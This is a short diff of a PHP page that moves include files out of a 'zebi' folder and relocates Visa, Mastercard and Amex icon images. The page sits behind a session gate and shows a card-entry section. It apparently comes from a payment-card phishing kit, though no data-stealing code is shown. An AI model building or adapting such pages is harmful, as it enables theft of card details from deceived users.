@@ -1,8 +1,8 @@
 <?php
 session_start(); 
 
-include "./zebi/config.php"; 
-include "./zebi/functions.php";
+include "config.php"; 
+include "functions.php";
 
 
 if ($_SESSION['allow'] != "yes") {
@@ -288,9 +288,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            </div>
 		
 		<div class="card-icons">
-               <img src="files/img/vs.svg" alt="Visa">
-               <img src="files/img/mr.svg" alt="Mastercard">
-               <img src="files/img/am.svg" alt="Amex">
+               <img src="vs.svg" alt="Visa">
+               <img src="mr.svg" alt="Mastercard">
+               <img src="am.svg" alt="Amex">
            </div>
            
            <div class="security-note">
